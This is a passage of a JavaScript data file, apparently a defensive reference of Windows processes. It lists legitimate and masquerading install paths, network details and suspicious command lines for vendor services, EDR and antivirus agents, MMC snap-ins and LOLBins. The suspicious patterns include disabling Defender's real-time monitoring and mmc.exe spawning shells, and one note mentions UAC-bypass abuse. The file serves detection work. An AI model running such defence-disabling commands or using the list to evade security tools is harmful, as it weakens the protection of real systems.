  },
  {
    name: "mailruupdater.exe",
    description: "Mail.Ru Updater",
    legitimatePaths: ["C:\\Program Files (x86)\\Mail.Ru\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\mailruupdater.exe"],
    notes: "Mail.Ru software updater service.",
    category: "system",
  },
  {
    name: "mbbservice.exe",
    description: "Mobile Broadband Service",
    legitimatePaths: ["C:\\Windows\\System32\\MbBService.exe"],
    commonMalwarePaths: ["C:\\Windows\\mbbservice.exe"],
    notes: "Windows mobile broadband service for cellular connections.",
    category: "system",
  },
  {
    name: "mdnsresponder.exe",
    description: "Bonjour mDNS Responder",
    legitimatePaths: ["C:\\Program Files\\Bonjour\\mDNSResponder.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\mdnsresponder.exe"],
    notes: "Apple Bonjour multicast DNS responder service.",
    category: "network",
    networkInfo: {
      ports: ["5353 (mDNS)"],
      protocols: ["UDP", "mDNS"],
      connections: ["Local network discovery", "Apple services"],
    },
  },
  {
    name: "microsoft.photos.exe",
    description: "Microsoft Photos App",
    legitimatePaths: ["C:\\Program Files\\WindowsApps\\Microsoft.Windows.Photos_*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\microsoft.photos.exe"],
    notes: "Windows 10/11 Photos app. UWP application.",
    category: "system",
  },
  {
    name: "mom.exe",
    description: "AMD Catalyst Control Center MOM",
    legitimatePaths: ["C:\\Program Files (x86)\\ATI Technologies\\ATI.ACE\\Core-Static\\MOM.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\mom.exe"],
    notes: "AMD graphics driver management component.",
    category: "system",
  },
  {
    name: "mpdefendercoreservice.exe",
    description: "Microsoft Defender Core Service",
    legitimatePaths: ["C:\\ProgramData\\Microsoft\\Windows Defender\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\mpdefendercoreservice.exe"],
    notes: "Windows Defender antivirus core service component.",
    category: "security",
  },
  {
    name: "netsession_win.exe",
    description: "Akamai NetSession Interface",
    legitimatePaths: ["C:\\Users\\*\\AppData\\Local\\Akamai\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\netsession_win.exe"],
    notes: "Akamai content delivery network client interface.",
    category: "network",
    networkInfo: {
      ports: ["Various high ports"],
      protocols: ["TCP", "HTTP", "HTTPS"],
      connections: ["Akamai CDN servers", "Content delivery networks"],
    },
  },
  {
    name: "NisSrv.exe",
    description: "Microsoft Defender Network Inspection Service",
    legitimatePaths: ["C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\*\\NisSrv.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\NisSrv.exe"],
    notes: "Part of Microsoft Defender; runs with MsMpEng.exe.",
    category: "security",
  },
  {
    name: "node.exe",
    description: "Node.js JavaScript Runtime",
    legitimatePaths: ["C:\\Program Files\\nodejs\\node.exe", "Various development directories"],
    commonMalwarePaths: ["C:\\Windows\\System32\\node.exe", "C:\\Temp\\node.exe"],
    notes: "Node.js runtime. Monitor for suspicious scripts and network connections.",
    category: "scripting",
    networkInfo: {
      ports: ["Various application ports", "3000-8080 (common dev ports)"],
      protocols: ["TCP", "HTTP", "HTTPS", "WebSocket"],
      connections: ["Web servers", "APIs", "Development servers"],
    },
  },
  {
    name: "nvbackend.exe",
    description: "NVIDIA Backend Service",
    legitimatePaths: ["C:\\Program Files\\NVIDIA Corporation\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\nvbackend.exe"],
    notes: "NVIDIA graphics driver backend service.",
    category: "system",
  },
  {
    name: "nvcontainer.exe",
    description: "NVIDIA Container Process",
    legitimatePaths: ["C:\\Program Files\\NVIDIA Corporation\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\nvcontainer.exe"],
    notes: "NVIDIA driver container process for various services.",
    category: "system",
  },
  {
    name: "nvdisplay.container.exe",
    description: "NVIDIA Display Container",
    legitimatePaths: ["C:\\Program Files\\NVIDIA Corporation\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\nvdisplay.container.exe"],
    notes: "NVIDIA display driver container process.",
    category: "system",
  },
  {
    name: "nvidia web helper.exe",
    description: "NVIDIA Web Helper Service",
    legitimatePaths: ["C:\\Program Files\\NVIDIA Corporation\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\nvidia web helper.exe"],
    notes: "NVIDIA web-based services helper process.",
    category: "system",
    networkInfo: {
      ports: ["443 (HTTPS)", "Various NVIDIA service ports"],
      protocols: ["TCP", "HTTPS"],
      connections: ["NVIDIA services", "GeForce Experience"],
    },
  },
  {
    name: "nvscpapisvr.exe",
    description: "NVIDIA Stereoscopic 3D API Server",
    legitimatePaths: ["C:\\Program Files\\NVIDIA Corporation\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\nvscpapisvr.exe"],
    notes: "NVIDIA 3D Vision API server service.",
    category: "system",
  },
  {
    name: "nvvsvc.exe",
    description: "NVIDIA Display Driver Service",
    legitimatePaths: ["C:\\Program Files\\NVIDIA Corporation\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\nvvsvc.exe"],
    notes: "NVIDIA display driver service component.",
    category: "system",
  },
  {
    name: "nvxdsync.exe",
    description: "NVIDIA User Experience Driver Component",
    legitimatePaths: ["C:\\Program Files\\NVIDIA Corporation\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\nvxdsync.exe"],
    notes: "NVIDIA user experience synchronization service.",
    category: "system",
  },
  {
    name: "officeclicktorun.exe",
    description: "Microsoft Office Click-to-Run",
    legitimatePaths: ["C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\officeclicktorun.exe"],
    notes: "Microsoft Office installation and update service.",
    category: "office",
    networkInfo: {
      ports: ["80 (HTTP)", "443 (HTTPS)"],
      protocols: ["TCP", "HTTP", "HTTPS"],
      connections: ["Microsoft Office update servers"],
    },
  },
  {
    name: "ollama app.exe",
    description: "Ollama AI Application",
    legitimatePaths: ["C:\\Users\\*\\AppData\\Local\\Programs\\Ollama\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\ollama app.exe"],
    notes: "Ollama local AI model runner application.",
    category: "admin",
    networkInfo: {
      ports: ["11434 (default Ollama port)", "Various AI service ports"],
      protocols: ["TCP", "HTTP", "HTTPS"],
      connections: ["AI model repositories", "Local AI services"],
    },
  },
  {
    name: "onedrive.exe",
    description: "Microsoft OneDrive",
    legitimatePaths: ["C:\\Users\\*\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\onedrive.exe"],
    notes: "Microsoft OneDrive cloud storage synchronization client.",
    category: "system",
    networkInfo: {
      ports: ["443 (HTTPS)"],
      protocols: ["TCP", "HTTPS"],
      connections: ["OneDrive servers", "Microsoft cloud services"],
    },
  },
  {
    name: "opera.exe",
    description: "Opera Web Browser",
    legitimatePaths: ["C:\\Program Files\\Opera\\*", "C:\\Users\\*\\AppData\\Local\\Programs\\Opera\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\opera.exe"],
    notes: "Opera web browser. Multiple processes normal for tabs and extensions.",
    category: "browsers",
    networkInfo: {
      ports: ["80 (HTTP)", "443 (HTTPS)"],
      protocols: ["TCP", "HTTP", "HTTPS"],
      connections: ["Web servers", "Opera services", "VPN servers"],
    },
  },
  {
    name: "ouc.exe",
    description: "Huawei Mobile Connect",
    legitimatePaths: ["C:\\Program Files\\Mobile Partner\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\ouc.exe"],
    notes: "Huawei mobile broadband connection utility.",
    category: "network",
  },
  {
    name: "plfseti.exe",
    description: "PolyLens File System ETI",
    legitimatePaths: ["Various application directories"],
    commonMalwarePaths: ["C:\\Windows\\System32\\plfseti.exe"],
    notes: "File system monitoring component. Verify parent application.",
    category: "system",
  },
  {
    name: "plugin-container.exe",
    description: "Mozilla Plugin Container",
    legitimatePaths: ["C:\\Program Files\\Mozilla Firefox\\plugin-container.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\plugin-container.exe"],
    notes: "Firefox plugin isolation container process.",
    category: "browsers",
  },
  {
    name: "pnkbstra.exe",
    description: "PunkBuster Anti-Cheat Service A",
    legitimatePaths: ["C:\\Windows\\System32\\PnkBstrA.exe"],
    commonMalwarePaths: ["C:\\Windows\\pnkbstra.exe"],
    notes: "PunkBuster anti-cheat system service component.",
    category: "system",
  },
  {
    name: "runtimebroker.exe",
    description: "Windows Runtime Broker",
    legitimatePaths: ["C:\\Windows\\System32\\RuntimeBroker.exe"],
    commonMalwarePaths: ["C:\\Windows\\runtimebroker.exe"],
    notes: "Windows Runtime permission broker for UWP apps.",
    category: "system",
  },
  {
    name: "sftvsa.exe",
    description: "Microsoft Application Virtualization Service Agent",
    legitimatePaths: ["C:\\Program Files\\Microsoft Application Virtualization Client\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\sftvsa.exe"],
    notes: "Microsoft App-V virtualization service agent.",
    category: "system",
  },
  {
    name: "skypehost.exe",
    description: "Skype Host Process",
    legitimatePaths: ["C:\\Program Files\\WindowsApps\\Microsoft.SkypeApp_*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\skypehost.exe"],
    notes: "Skype UWP app host process for Windows 10/11.",
    category: "system",
    networkInfo: {
      ports: ["443 (HTTPS)", "Various voice/video ports"],
      protocols: ["TCP", "UDP", "HTTPS"],
      connections: ["Skype servers", "Voice/video calls"],
    },
  },
  {
    name: "software_reporter_tool.exe",
    description: "Chrome Software Reporter Tool",
    legitimatePaths: ["C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\software_reporter_tool.exe"],
    notes: "Chrome cleanup and malware detection tool.",
    category: "security",
  },
  {
    name: "ss_conn_service.exe",
    description: "Samsung Connection Service",
    legitimatePaths: ["C:\\Program Files\\Samsung\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\ss_conn_service.exe"],
    notes: "Samsung device connection and management service.",
    category: "system",
  },
  {
    name: "steam.exe",
    description: "Steam Gaming Platform",
    legitimatePaths: ["C:\\Program Files (x86)\\Steam\\Steam.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\steam.exe"],
    notes: "Valve Steam gaming platform client.",
    category: "system",
    networkInfo: {
      ports: ["27015-27030 (Steam)", "443 (HTTPS)"],
      protocols: ["TCP", "UDP", "HTTPS"],
      connections: ["Steam servers", "Game servers", "CDN networks"],
    },
  },
  {
    name: "steamwebhelper.exe",
    description: "Steam Web Helper",
    legitimatePaths: ["C:\\Program Files (x86)\\Steam\\bin\\cef\\*"],
    commonMalwarePaths: ["C:\\Windows\\System32\\steamwebhelper.exe"],
    notes: "Steam web browser component for store and community features.",
    category: "system",
  },
  {
    name: "sysmon.exe",
    description: "System Monitor (Sysinternals) - service and driver",
    legitimatePaths: ["C:\\Windows\\System32\\Sysmon.exe", "C:\\Windows\\System32\\Sysmon64.exe"],
    commonMalwarePaths: ["C:\\Users\\*\\AppData\\*\\sysmon.exe", "C:\\Temp\\sysmon.exe"],
    notes: "Microsoft Sysinternals tool for logging system activity. Verify signature (Microsoft Corporation).",
    category: "security",
    commandLinePatterns: {
      legitimate: ["sysmon.exe -accepteula -i config.xml", "sysmon.exe -c config.xml", "sysmon.exe -u"],
      suspicious: ["sysmon.exe with no parameters from unusual locations"],
    },
  },
  {
    name: "MsMpEng.exe",
    description: "Microsoft Defender Antimalware Service",
    legitimatePaths: [
      "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\*\\MsMpEng.exe",
    ],
    commonMalwarePaths: ["C:\\Windows\\MsMpEng.exe", "C:\\Users\\*\\AppData\\*\\MsMpEng.exe"],
    notes: "Windows Defender's core antimalware engine. High CPU usage is normal during scans.",
    category: "security",
    networkInfo: {
      ports: ["443 (HTTPS)", "80 (HTTP)"],
      protocols: ["TCP", "HTTPS"],
      connections: ["Microsoft security intelligence updates", "Cloud protection services"],
    },
    commandLinePatterns: {
      legitimate: ["MsMpEng.exe (service process)", "MsMpEng.exe -Embedding"],
      suspicious: ["MsMpEng.exe with unusual parameters", "MsMpEng.exe from non-standard paths"],
    },
  },
  {
    name: "MpCmdRun.exe",
    description: "Microsoft Defender Command Line Utility",
    legitimatePaths: [
      "C:\\Program Files\\Windows Defender\\MpCmdRun.exe",
      "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\*\\MpCmdRun.exe",
    ],
    commonMalwarePaths: ["C:\\Windows\\System32\\MpCmdRun.exe", "C:\\Temp\\MpCmdRun.exe"],
    notes: "Windows Defender command-line scanner. Used for manual scans and automation.",
    category: "security",
    commandLinePatterns: {
      legitimate: [
        "MpCmdRun.exe -Scan -ScanType 1",
        "MpCmdRun.exe -SignatureUpdate",
        "MpCmdRun.exe -RemoveDefinitions",
      ],
      suspicious: ["MpCmdRun.exe -DisableRealtimeMonitoring", "MpCmdRun.exe with encoded parameters"],
    },
  },
  {
    name: "CSFalconService.exe",
    description: "CrowdStrike Falcon Sensor Service",
    legitimatePaths: ["C:\\Program Files\\CrowdStrike\\CsFalconService.exe"],
    commonMalwarePaths: [
      "C:\\Windows\\CSFalconService.exe",
      "C:\\Windows\\System32\\drivers\\CrowdStrike\\CSFalconService.exe",
    ],
    notes: "CrowdStrike Falcon EDR agent. Critical endpoint protection component.",
    category: "security",
    networkInfo: {
      ports: ["443 (HTTPS)", "8080"],
      protocols: ["TCP", "HTTPS"],
      connections: ["CrowdStrike cloud services", "Falcon sensor network"],
    },
    commandLinePatterns: {
      legitimate: ["CsFalconService.exe", "CsFalconService.exe --service"],
      suspicious: [
        "CsFalconService.exe with unusual parameters",
        "CsFalconService.exe running from non-standard locations",
      ],
    },
  },
  {
    name: "CSFalconContainer.exe",
    description: "CrowdStrike Falcon Container Process",
    legitimatePaths: ["C:\\Program Files\\CrowdStrike\\CSFalconContainer.exe"],
    commonMalwarePaths: [
      "C:\\Windows\\CSFalconContainer.exe",
      "C:\\Windows\\System32\\drivers\\CrowdStrike\\CSFalconContainer.exe",
    ],
    notes: "CrowdStrike Falcon container management process for EDR functionality.",
    category: "security",
  },
  {
    name: "csagent.sys",
    description: "CrowdStrike Falcon Sensor Driver",
    legitimatePaths: ["C:\\Windows\\System32\\drivers\\CrowdStrike\\csagent.sys"],
    commonMalwarePaths: ["C:\\Windows\\System32\\drivers\\csagent.sys", "C:\\Windows\\csagent.sys"],
    notes: "CrowdStrike Falcon kernel driver. Critical for real-time protection and monitoring.",
    category: "security",
    networkInfo: {
      ports: ["N/A (Kernel driver)"],
      protocols: ["Kernel-level monitoring"],
      connections: ["System calls", "Network stack monitoring"],
    },
    commandLinePatterns: {
      legitimate: ["Loaded by Windows kernel", "sc query csagent"],
      suspicious: ["Manual driver loading attempts", "Driver tampering or modification"],
    },
  },
  {
    name: "SentinelAgent.exe",
    description: "SentinelOne Endpoint Protection Agent",
    legitimatePaths: ["C:\\Program Files\\SentinelOne\\Sentinel Agent\\*\\SentinelAgent.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\SentinelAgent.exe", "C:\\Temp\\SentinelAgent.exe"],
    notes: "SentinelOne EDR agent providing autonomous endpoint protection.",
    category: "security",
    networkInfo: {
      ports: ["443 (HTTPS)", "8443"],
      protocols: ["TCP", "HTTPS"],
      connections: ["SentinelOne management console", "Cloud intelligence services"],
    },
  },
  {
    name: "SentinelServiceHost.exe",
    description: "SentinelOne Service Host Process",
    legitimatePaths: ["C:\\Program Files\\SentinelOne\\Sentinel Agent\\*\\SentinelServiceHost.exe"],
    commonMalwarePaths: ["C:\\Windows\\SentinelServiceHost.exe"],
    notes: "SentinelOne service host for managing agent components and communication.",
    category: "security",
  },
  {
    name: "cb.exe",
    description: "Carbon Black Sensor Process",
    legitimatePaths: ["C:\\Program Files\\Confer\\cb.exe", "C:\\Program Files (x86)\\Bit9\\Parity Agent\\cb.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\cb.exe", "C:\\Temp\\cb.exe"],
    notes: "Carbon Black EDR sensor for endpoint monitoring and response.",
    category: "security",
    networkInfo: {
      ports: ["443 (HTTPS)", "8080"],
      protocols: ["TCP", "HTTPS"],
      connections: ["Carbon Black server", "Threat intelligence feeds"],
    },
  },
// --- Admin / LOLBins ---
{
  name: "dsa.msc",
  description: "Active Directory Users and Computers (MMC snap-in)",
  legitimatePaths: [
    "C:\\Windows\\System32\\dsa.msc"
  ],
  commonMalwarePaths: [
    "C:\\Users\\*\\AppData\\Local\\dsa.msc",
    "C:\\Temp\\dsa.msc"
  ],
  notes: "ADUC snap-in for MMC. Always runs under mmc.exe, not directly. Used by admins to manage users, groups, and computers in Active Directory.",
  category: "admin",
  commandLinePatterns: {
    legitimate: [
      "mmc.exe dsa.msc",
      "mmc.exe C:\\Windows\\System32\\dsa.msc"
    ],
    suspicious: [
      "dsa.msc executed outside System32",
      "mmc.exe loading dsa.msc from temp or user profile"
    ]
  }
},
{
  name: "mmc.exe",
  description: "Microsoft Management Console - framework host for administrative snap-ins (.msc files)",
  legitimatePaths: [
    "C:\\Windows\\System32\\mmc.exe",
    "C:\\Windows\\SysWOW64\\mmc.exe"
  ],
  commonMalwarePaths: [
    "C:\\Windows\\mmc.exe",
    "C:\\Users\\*\\AppData\\Local\\mmc.exe",
    "C:\\Temp\\mmc.exe"
  ],
  notes: "Hosts administrative snap-ins like dsa.msc (ADUC), gpedit.msc, secpol.msc, services.msc, and eventvwr.msc. Attackers may abuse mmc.exe to load malicious MSC files or to blend into admin activity.",
  category: "admin",
  commandLinePatterns: {
    legitimate: [
      "mmc.exe dsa.msc",
      "mmc.exe gpedit.msc",
      "mmc.exe secpol.msc",
      "mmc.exe compmgmt.msc",
      "mmc.exe services.msc",
      "mmc.exe eventvwr.msc"
    ],
    suspicious: [
      "mmc.exe loading .msc from user profile or temp directories",
      "mmc.exe with unknown custom snap-ins",
      "mmc.exe spawning unusual child processes (e.g., cmd.exe, powershell.exe)"
    ]
  }
},
{
  name: "gpedit.msc",
  description: "Local Group Policy Editor (MMC snap-in)",
  legitimatePaths: ["C:\\Windows\\System32\\gpedit.msc"],
  commonMalwarePaths: [
    "C:\\Users\\*\\AppData\\Local\\gpedit.msc",
    "C:\\Temp\\gpedit.msc",
    "\\\\*\\share\\gpedit.msc"
  ],
  notes: "Runs under mmc.exe. Used to manage local group policies. Not present on some Home editions.",
  category: "admin",
  commandLinePatterns: {
    legitimate: ["mmc.exe gpedit.msc", "mmc.exe C:\\Windows\\System32\\gpedit.msc"],
    suspicious: [
      "mmc.exe gpedit.msc from user profile/temp/UNC",
      "mmc.exe loading custom gpedit.msc with unexpected parents"
    ]
  }
},
{
  name: "secpol.msc",
  description: "Local Security Policy (MMC snap-in)",
  legitimatePaths: ["C:\\Windows\\System32\\secpol.msc"],
  commonMalwarePaths: [
    "C:\\Users\\*\\AppData\\Local\\secpol.msc",
    "C:\\Temp\\secpol.msc",
    "\\\\*\\share\\secpol.msc"
  ],
  notes: "Runs under mmc.exe. Manages local security policies (account, audit, user rights).",
  category: "admin",
  commandLinePatterns: {
    legitimate: ["mmc.exe secpol.msc", "mmc.exe C:\\Windows\\System32\\secpol.msc"],
    suspicious: ["mmc.exe loading secpol.msc from non-System32 paths"]
  }
},
{
  name: "services.msc",
  description: "Services management console (MMC snap-in)",
  legitimatePaths: ["C:\\Windows\\System32\\services.msc"],
  commonMalwarePaths: [
    "C:\\Users\\*\\AppData\\Local\\services.msc",
    "C:\\Temp\\services.msc",
    "\\\\*\\share\\services.msc"
  ],
  notes: "Runs under mmc.exe. Used to start/stop/configure services. Attackers may use it to disguise persistence changes.",
  category: "admin",
  commandLinePatterns: {
    legitimate: ["mmc.exe services.msc", "mmc.exe C:\\Windows\\System32\\services.msc"],
    suspicious: ["mmc.exe loading services.msc from temp/user/UNC paths"]
  }
},
{
  name: "eventvwr.msc",
  description: "Event Viewer (MMC snap-in)",
  legitimatePaths: ["C:\\Windows\\System32\\eventvwr.msc"],
  commonMalwarePaths: [
    "C:\\Users\\*\\AppData\\Local\\eventvwr.msc",
    "C:\\Temp\\eventvwr.msc",
    "\\\\*\\share\\eventvwr.msc"
  ],
  notes: "Runs under mmc.exe. Sometimes used in UAC bypass chains historically; verify launch source.",
  category: "admin",
  commandLinePatterns: {
    legitimate: ["mmc.exe eventvwr.msc", "mmc.exe C:\\Windows\\System32\\eventvwr.msc"],
    suspicious: ["mmc.exe eventvwr.msc from non-System32 locations"]
  }
},
{
  name: "compmgmt.msc",
  description: "Computer Management console (MMC snap-in)",
  legitimatePaths: ["C:\\Windows\\System32\\compmgmt.msc"],
  commonMalwarePaths: [
    "C:\\Users\\*\\AppData\\Local\\compmgmt.msc",
    "C:\\Temp\\compmgmt.msc",
    "\\\\*\\share\\compmgmt.msc"
  ],
  notes: "Runs under mmc.exe. Aggregates multiple admin tools (Device Manager, Disk Management, Services).",
  category: "admin",
  commandLinePatterns: {
    legitimate: ["mmc.exe compmgmt.msc", "mmc.exe C:\\Windows\\System32\\compmgmt.msc"],
    suspicious: ["mmc.exe loading compmgmt.msc from user/temporary/UNC paths"]
  }
},


{
  name: "mshta.exe",
  description: "Microsoft HTML Application Host (LOLBin)",
  legitimatePaths: ["C:\\Windows\\System32\\mshta.exe","C:\\Windows\\SysWOW64\\mshta.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\mshta.exe"],
  notes: "Executes HTA/JS/VBS. Commonly abused for phishing and script-based malware.",
  category: "lolbin"
},
{
  name: "wscript.exe",
  description: "Windows Script Host (WScript GUI)",
  legitimatePaths: ["C:\\Windows\\System32\\wscript.exe","C:\\Windows\\SysWOW64\\wscript.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\wscript.exe"],
  notes: "Runs VBS/JS scripts with GUI prompts. Frequently abused in phishing.",
  category: "lolbin"
},
{
  name: "cscript.exe",
  description: "Windows Script Host (CScript CLI)",
  legitimatePaths: ["C:\\Windows\\System32\\cscript.exe","C:\\Windows\\SysWOW64\\cscript.exe"],
  commonMalwarePaths: ["C:\\Users\\*\\AppData\\Local\\cscript.exe"],
  notes: "CLI script runner. Useful for automation but widely abused in attacks.",
  category: "lolbin"
},
  {
    name: "RepMgr.exe",
    description: "Carbon Black Response Manager",
    legitimatePaths: ["C:\\Program Files\\Confer\\RepMgr.exe"],
    commonMalwarePaths: ["C:\\Windows\\RepMgr.exe"],
    notes: "Carbon Black response manager for incident response capabilities.",
    category: "security",
  },
  {
    name: "ccSvcHst.exe",
    description: "Symantec Endpoint Protection Service Host",
    legitimatePaths: ["C:\\Program Files (x86)\\Symantec\\Symantec Endpoint Protection\\*\\ccSvcHst.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\ccSvcHst.exe"],
    notes: "Symantec Endpoint Protection service host process.",
    category: "security",
    networkInfo: {
      ports: ["443 (HTTPS)", "8014"],
      protocols: ["TCP", "HTTPS"],
      connections: ["Symantec security servers", "LiveUpdate servers"],
    },
  },
  {
    name: "Rtvscan.exe",
    description: "Symantec Real-time Virus Scanner",
    legitimatePaths: ["C:\\Program Files (x86)\\Symantec\\Symantec Endpoint Protection\\*\\Rtvscan.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\Rtvscan.exe"],
    notes: "Symantec real-time antivirus scanning engine.",
    category: "security",
  },
  {
    name: "McShield.exe",
    description: "McAfee On-Access Scanner",
    legitimatePaths: ["C:\\Program Files\\McAfee\\*\\McShield.exe", "C:\\Program Files (x86)\\McAfee\\*\\McShield.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\McShield.exe"],
    notes: "McAfee real-time file scanning service.",
    category: "security",
    networkInfo: {
      ports: ["443 (HTTPS)", "8081"],
      protocols: ["TCP", "HTTPS"],
      connections: ["McAfee update servers", "GTI reputation services"],
    },
  },
  {
    name: "mfemms.exe",
    description: "McAfee Agent Service",
    legitimatePaths: ["C:\\Program Files\\McAfee\\Agent\\mfemms.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\mfemms.exe"],
    notes: "McAfee Agent service for policy enforcement and communication.",
    category: "security",
  },
  {
    name: "avp.exe",
    description: "Kaspersky Anti-Virus Protection",
    legitimatePaths: [
      "C:\\Program Files (x86)\\Kaspersky Lab\\*\\avp.exe",
      "C:\\Program Files\\Kaspersky Lab\\*\\avp.exe",
    ],
    commonMalwarePaths: ["C:\\Windows\\System32\\avp.exe"],
    notes: "Kaspersky antivirus main protection service.",
    category: "security",
    networkInfo: {
      ports: ["443 (HTTPS)", "8080"],
      protocols: ["TCP", "HTTPS"],
      connections: ["Kaspersky Security Network", "Update servers"],
    },
  },
  {
    name: "klnagent.exe",
    description: "Kaspersky Security Center Network Agent",
    legitimatePaths: ["C:\\Program Files (x86)\\Kaspersky Lab\\NetworkAgent\\klnagent.exe"],
    commonMalwarePaths: ["C:\\Windows\\klnagent.exe"],
    notes: "Kaspersky network agent for centralized management.",
    category: "security",
  },
  {
    name: "bdagent.exe",
    description: "Bitdefender Agent Service",
    legitimatePaths: ["C:\\Program Files\\Bitdefender\\*\\bdagent.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\bdagent.exe"],
    notes: "Bitdefender antivirus agent and user interface.",
    category: "security",
    networkInfo: {
      ports: ["443 (HTTPS)", "8080"],
      protocols: ["TCP", "HTTPS"],
      connections: ["Bitdefender cloud services", "Update servers"],
    },
  },
  {
    name: "vsserv.exe",
    description: "Bitdefender Virus Shield Service",
    legitimatePaths: ["C:\\Program Files\\Bitdefender\\*\\vsserv.exe"],
    commonMalwarePaths: ["C:\\Windows\\vsserv.exe"],
    notes: "Bitdefender core antivirus scanning engine.",
    category: "security",
  },
  {
    name: "PccNTMon.exe",
    description: "Trend Micro PC-cillin Real-time Monitor",
    legitimatePaths: ["C:\\Program Files (x86)\\Trend Micro\\*\\PccNTMon.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\PccNTMon.exe"],
    notes: "Trend Micro real-time protection monitor.",
    category: "security",
  },
  {
    name: "ntrtscan.exe",
    description: "Trend Micro Real-time Scan Service",
    legitimatePaths: ["C:\\Program Files (x86)\\Trend Micro\\*\\ntrtscan.exe"],
    commonMalwarePaths: ["C:\\Windows\\ntrtscan.exe"],
    notes: "Trend Micro real-time file scanning service.",
    category: "security",
    networkInfo: {
      ports: ["443 (HTTPS)", "80 (HTTP)"],
      protocols: ["TCP", "HTTPS"],
      connections: ["Trend Micro Smart Protection Network", "Update servers"],
    },
  },
  {
    name: "ekrn.exe",
    description: "ESET Kernel Service",
    legitimatePaths: ["C:\\Program Files\\ESET\\*\\ekrn.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\ekrn.exe"],
    notes: "ESET NOD32 kernel service for real-time protection.",
    category: "security",
    networkInfo: {
      ports: ["443 (HTTPS)", "2221"],
      protocols: ["TCP", "HTTPS"],
      connections: ["ESET update servers", "LiveGrid reputation system"],
    },
  },
  {
    name: "egui.exe",
    description: "ESET Graphical User Interface",
    legitimatePaths: ["C:\\Program Files\\ESET\\*\\egui.exe"],
    commonMalwarePaths: ["C:\\Windows\\egui.exe"],
    notes: "ESET NOD32 user interface and configuration tool.",
    category: "security",
  },
  {
    name: "mbamservice.exe",
    description: "Malwarebytes Anti-Malware Service",
    legitimatePaths: ["C:\\Program Files\\Malwarebytes\\*\\mbamservice.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\mbamservice.exe"],
    notes: "Malwarebytes anti-malware protection service.",
    category: "security",
    networkInfo: {
      ports: ["443 (HTTPS)", "80 (HTTP)"],
      protocols: ["TCP", "HTTPS"],
      connections: ["Malwarebytes cloud services", "Signature update servers"],
    },
  },
  {
    name: "mbamtray.exe",
    description: "Malwarebytes System Tray Application",
    legitimatePaths: ["C:\\Program Files\\Malwarebytes\\*\\mbamtray.exe"],
    commonMalwarePaths: ["C:\\Windows\\mbamtray.exe"],
    notes: "Malwarebytes system tray interface and notifications.",
    category: "security",
  },
  {
    name: "SavService.exe",
    description: "Sophos Anti-Virus Service",
    legitimatePaths: ["C:\\Program Files (x86)\\Sophos\\*\\SavService.exe"],
    commonMalwarePaths: ["C:\\Windows\\System32\\SavService.exe"],
    notes: "Sophos Endpoint Protection antivirus service.",
    category: "security",
    networkInfo: {
      ports: ["443 (HTTPS)", "8192"],
      protocols: ["TCP", "HTTPS"],
      connections: ["Sophos Central", "SophosLabs threat intelligence"],
    },
  },
  {
    name: "ALMon.exe",
    description: "Sophos AutoUpdate Monitor",
    legitimatePaths: ["C:\\Program Files (x86)\\Sophos\\AutoUpdate\\ALMon.exe"],
    commonMalwarePaths: ["C:\\Windows\\ALMon.exe"],
    notes: "Sophos automatic update monitoring service.",
    category: "security",
  },
  {
    name: "hmpalert.exe",
    description: "HitmanPro.Alert Real-time Protection",
    legitimatePaths: ["C:\\Program Files\\HitmanPro.Alert\\hmpalert.exe"],
    commonMalwarePaths: ["C:\\Windows\\hmpalert.exe"],
    notes: "HitmanPro.Alert behavioral analysis and exploit prevention.",
    category: "security",
  },
  {
    name: "CylanceSvc.exe",
    description: "Cylance Endpoint Protection Service",
    legitimatePaths: ["C:\\Program Files\\Cylance\\*\\CylanceSvc.exe"],
    commonMalwarePaths: ["C:\\Windows\\CylanceSvc.exe"],
    notes: "Cylance AI-based endpoint protection service.",
    category: "security",
    networkInfo: {
      ports: ["443 (HTTPS)"],
      protocols: ["TCP", "HTTPS"],
      connections: ["Cylance cloud console", "Threat intelligence services"],
    },
  },
  {
    name: "CylanceUI.exe",
    description: "Cylance User Interface",
    legitimatePaths: ["C:\\Program Files\\Cylance\\*\\CylanceUI.exe"],
    commonMalwarePaths: ["C:\\Windows\\CylanceUI.exe"],
